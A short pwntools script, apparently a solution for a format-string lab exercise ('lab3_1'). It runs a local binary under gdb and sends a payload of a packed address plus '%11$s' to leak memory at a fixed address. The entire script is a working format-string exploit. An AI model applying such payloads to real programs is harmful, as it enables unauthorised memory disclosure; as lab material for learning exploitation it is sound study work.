from pwn import *

p = process('./lab3_1')

gdb.attach(p, 'b *0x08048602')
pause()

offset = 11
target_addr = 0x0804A034
payload = p32(target_addr) + b'%11$s'

p.sendafter(b'Give me something...\n', payload)

p.interactive()